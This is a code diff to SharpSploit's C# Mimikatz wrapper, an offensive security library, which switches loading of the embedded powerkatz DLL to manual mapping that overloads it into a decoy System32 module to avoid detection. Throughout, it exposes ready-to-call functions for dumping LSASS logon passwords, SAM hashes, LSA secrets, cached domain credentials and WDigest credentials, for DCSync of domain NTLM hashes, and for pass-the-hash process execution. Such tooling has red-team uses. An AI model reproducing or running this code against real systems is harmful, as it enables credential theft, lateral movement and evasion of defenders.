@@ -9,8 +9,10 @@ using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 
 using SharpSploit.Misc;
-using SharpSploit.Execution;
+using SharpSploit.Execution.ManualMap;
 using PInvoke = SharpSploit.Execution.PlatformInvoke;
+using SharpSploit.Persistence;
+using System.Diagnostics;
 
 namespace SharpSploit.Credentials
 {
@@ -22,9 +24,7 @@ namespace SharpSploit.Credentials
     /// <remarks>
     /// Mimikatz is a tool for playing with credentials in Windows, written by Benjamin Delpy (@gentilkiwi). (Found
     /// at https://github.com/gentilkiwi/mimikatz).
-    /// SharpSploit's PE Loader is adapted from work by Casey Smith (@subtee). (No longer available at original location.)
-    /// This wrapper class is adapted from Chris Ross (@xorrior)'s implementation. (Found
-    /// at https://github.com/xorrior/Random-CSharpTools/tree/master/DllLoader/DllLoader)
+    /// This wrapper class is adapted from Chris Ross (@xorrior)'s implementation, converted by (@TheRealWover) to use the Manual Mapping API.
     /// </remarks>
     public class Mimikatz
     {
@@ -32,53 +32,66 @@ namespace SharpSploit.Credentials
         private static byte[] PEBytes64 { get; set; }
 
         private static PE MimikatzPE { get; set; } = null;
-        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-        private delegate IntPtr MimikatzType(IntPtr command);
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl, CharSet = CharSet.Unicode)]
+        private delegate string MimikatzType(string command);
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes a chosen Mimikatz command.
+        /// Loads the Mimikatz PE and executes a chosen Mimikatz command.
         /// </summary>
         /// <param name="Command">Mimikatz command to be executed.</param>
+        /// <param name="DecoyModulePath">Optionally specify a module to overload Mimikatz into. By default, a random DLL in WINDIR\System32 will be selected.</param>
         /// <returns>Mimikatz output.</returns>
-        public static string Command(string Command = "privilege::debug sekurlsa::logonPasswords")
+        public static string Command(string Command = "privilege::debug sekurlsa::logonPasswords", string DecoyModulePath = null)
         {
+
+            PE.PE_MANUAL_MAP MimikatzPE = new PE.PE_MANUAL_MAP();
             // Console.WriteLine(String.Join(",", System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceNames()));
-            if (MimikatzPE == null)
+
+            string[] manifestResources = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceNames();
+
+            try
             {
-                string[] manifestResources = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceNames();
-                if (IntPtr.Size == 4 && MimikatzPE == null)
+                if (IntPtr.Size == 4)
                 {
                     if (PEBytes32 == null)
                     {
                         PEBytes32 = Utilities.GetEmbeddedResourceBytes("powerkatz_x86.dll");
                         if (PEBytes32 == null) { return ""; }
                     }
-                    MimikatzPE = PE.Load(PEBytes32);
+
+                    MimikatzPE = Overload.OverloadModule(PEBytes32, DecoyModulePath: DecoyModulePath, LegitSigned: false);
                 }
-                else if (IntPtr.Size == 8 && MimikatzPE == null)
+                else if (IntPtr.Size == 8)
                 {
                     if (PEBytes64 == null)
                     {
                         PEBytes64 = Utilities.GetEmbeddedResourceBytes("powerkatz_x64.dll");
                         if (PEBytes64 == null) { return ""; }
                     }
-                    MimikatzPE = PE.Load(PEBytes64);
+
+                    MimikatzPE = Overload.OverloadModule(PEBytes64, DecoyModulePath: DecoyModulePath, LegitSigned: false);
                 }
             }
-            if (MimikatzPE == null) { return ""; }
-            IntPtr functionPointer = MimikatzPE.GetFunctionExport("powershell_reflective_mimikatz");
-            if (functionPointer == IntPtr.Zero) { return ""; }
+            catch (Exception ex)
+            {
+                return ex.Message;
+            }
 
-            MimikatzType mimikatz = (MimikatzType) Marshal.GetDelegateForFunctionPointer(functionPointer, typeof(MimikatzType));
-            IntPtr input = Marshal.StringToHGlobalUni(Command);
+            string input = Command;
             try
             {
-                IntPtr output = IntPtr.Zero;
+                string output = "";
                 Thread t = new Thread(() =>
                 {
                     try
                     {
-                        output = mimikatz(input);
+                        object[] parameters =
+                        {
+                            input
+                        };
+
+                        output = (string)Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(MimikatzPE.PEINFO, MimikatzPE.ModuleBase, "powershell_reflective_mimikatz", typeof(MimikatzType), parameters);
                     }
                     catch (Exception e)
                     {
@@ -87,14 +100,14 @@ namespace SharpSploit.Credentials
                 });
                 t.Start();
                 t.Join();
-                Marshal.FreeHGlobal(input);
-                if (output == IntPtr.Zero)
+
+                if (output == "")
                 {
+
                     return "";
                 }
-                string stroutput = Marshal.PtrToStringUni(output);
-                PInvoke.Win32.Kernel32.LocalFree(output);
-                return stroutput;
+
+                return output;
             }
             catch (Exception e)
             {
@@ -104,79 +117,96 @@ namespace SharpSploit.Credentials
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatzcommand to retrieve plaintext
+        /// Loads the Mimikatz PE and executes the Mimikatz command to get some coffee.
+        /// Equates to `Command("coffee")`.
+        /// </summary>
+        /// <param name="DecoyModulePath">Optionally specify a module to overload Mimikatz into. By default, a random DLL in WINDIR\System32 will be selected.</param>
+        /// <returns>Mimikatz output.</returns>
+        public static string Coffee(string DecoyModulePath = null)
+        {
+            return Command("coffee", DecoyModulePath);
+        }
+
+        /// <summary>
+        /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve plaintext
         /// passwords from LSASS. Equates to `Command("privilege::debug sekurlsa::logonPasswords")`. (Requires Admin)
         /// </summary>
+        /// <param name="DecoyModulePath">Optionally specify a module to overload Mimikatz into. By default, a random DLL in WINDIR\System32 will be selected.</param>
         /// <returns>Mimikatz output.</returns>
-        public static string LogonPasswords()
-		{
-			return Command("privilege::debug sekurlsa::logonPasswords");
-		}
+        public static string LogonPasswords(string DecoyModulePath = null)
+        {
+            return Command("privilege::debug sekurlsa::logonPasswords", DecoyModulePath);
+        }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatz command to retrieve password hashes
+        /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve password hashes
         /// from the SAM database. Equates to `Command("privilege::debug lsadump::sam")`. (Requires Admin)
         /// </summary>
+        /// <param name="DecoyModulePath">Optionally specify a module to overload Mimikatz into. By default, a random DLL in WINDIR\System32 will be selected.</param>
         /// <returns>Mimikatz output.</returns>
-		public static string SamDump()
+		public static string SamDump(string DecoyModulePath = null)
         {
-			return Command("token::elevate lsadump::sam");
+            return Command("token::elevate lsadump::sam", DecoyModulePath);
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatz command to retrieve LSA secrets
+        /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve LSA secrets
         /// stored in registry. Equates to `Command("privilege::debug lsadump::secrets")`. (Requires Admin)
         /// </summary>
+        /// <param name="DecoyModulePath">Optionally specify a module to overload Mimikatz into. By default, a random DLL in WINDIR\System32 will be selected.</param>
         /// <returns>Mimikatz output.</returns>
-		public static string LsaSecrets()
+		public static string LsaSecrets(string DecoyModulePath = null)
         {
-            return Command("token::elevate lsadump::secrets");
+            return Command("token::elevate lsadump::secrets", DecoyModulePath);
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatz command to retrieve Domain
+        /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve Domain
         /// Cached Credentials hashes from registry. Equates to `Command("privilege::debug lsadump::cache")`.
         /// (Requires Admin)
         /// </summary>
+        /// <param name="DecoyModulePath">Optionally specify a module to overload Mimikatz into. By default, a random DLL in WINDIR\System32 will be selected.</param>
         /// <returns>Mimikatz output.</returns>
-		public static string LsaCache()
+		public static string LsaCache(string DecoyModulePath = null)
         {
-            return Command("token::elevate lsadump::cache");
+            return Command("token::elevate lsadump::cache", DecoyModulePath);
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatz command to retrieve Wdigest
+        /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve Wdigest
         /// credentials from registry. Equates to `Command("sekurlsa::wdigest")`.
         /// </summary>
+        /// <param name="DecoyModulePath">Optionally specify a module to overload Mimikatz into. By default, a random DLL in WINDIR\System32 will be selected.</param>
         /// <returns>Mimikatz output.</returns>
-		public static string Wdigest()
+		public static string Wdigest(string DecoyModulePath = null)
         {
-            return Command("sekurlsa::wdigest");
+            return Command("sekurlsa::wdigest", DecoyModulePath);
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes each of the builtin local commands (not DCSync). (Requires Admin)
+        /// Loads the Mimikatz PE and executes each of the builtin local commands (not DCSync). (Requires Admin)
         /// </summary>
         /// <returns>Mimikatz output.</returns>
 		public static string All()
         {
-			StringBuilder builder = new StringBuilder();
-			builder.AppendLine(LogonPasswords());
-			builder.AppendLine(SamDump());
-			builder.AppendLine(LsaSecrets());
-			builder.AppendLine(LsaCache());
-			builder.AppendLine(Wdigest());
-			return builder.ToString();
+            StringBuilder builder = new StringBuilder();
+            builder.AppendLine(LogonPasswords());
+            builder.AppendLine(SamDump());
+            builder.AppendLine(LsaSecrets());
+            builder.AppendLine(LsaCache());
+            builder.AppendLine(Wdigest());
+            return builder.ToString();
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the "dcsync" module to retrieve the NTLM hash of a specified (or all) Domain user. (Requires Domain Admin)
+        /// Loads the Mimikatz PE and executes the "dcsync" module to retrieve the NTLM hash of a specified (or all) Domain user. (Requires Domain Admin)
         /// </summary>
         /// <param name="user">Username to retrieve NTLM hash for. "All" for all domain users.</param>
         /// <param name="FQDN">Optionally specify an alternative fully qualified domain name. Default is current domain.</param>
         /// <param name="DC">Optionally specify a specific Domain Controller to target for the dcsync.</param>
+        /// <param name="DecoyModulePath">Optionally specify a module to overload Mimikatz into. By default, a random DLL in WINDIR\System32 will be selected.</param>
         /// <returns>The NTLM hash of the target user(s).</returns>
-        public static string DCSync(string user, string FQDN = null, string DC = null)
+        public static string DCSync(string user, string FQDN = null, string DC = null, string DecoyModulePath = null)
         {
             string command = "\"";
             command += "lsadump::dcsync";
@@ -202,19 +232,20 @@ namespace SharpSploit.Credentials
             }
             command += "\"";
 
-            return Command(command);
+            return Command(command, DecoyModulePath);
         }
 
         /// <summary>
-        /// Loads the Mimikatz PE with `PE.Load()` and executes the "pth" module to start a new process
+        /// Loads the Mimikatz PE and executes the "pth" module to start a new process
         /// as a user using an NTLM password hash for authentication.
         /// </summary>
         /// <param name="user">Username to authenticate as.</param>
         /// <param name="NTLM">NTLM hash to authenticate the user.</param>
         /// <param name="FQDN">Optionally specify an alternative fully qualified domain name. Default is current domain.</param>
         /// <param name="run">The command to execute as the specified user.</param>
+        /// <param name="DecoyModulePath">Optionally specify a module to overload Mimikatz into. By default, a random DLL in WINDIR\System32 will be selected.</param>
         /// <returns></returns>
-        public static string PassTheHash(string user, string NTLM, string FQDN = null, string run = "cmd.exe")
+        public static string PassTheHash(string user, string NTLM, string FQDN = null, string run = "cmd.exe", string DecoyModulePath = null)
         {
             string command = "\"";
             command += "sekurlsa::pth";
@@ -230,7 +261,7 @@ namespace SharpSploit.Credentials
             command += " /ntlm:" + NTLM;
             command += " /run:" + run;
             command += "\"";
-            return Command(command);
+            return Command(command, DecoyModulePath);
         }
     }
 }
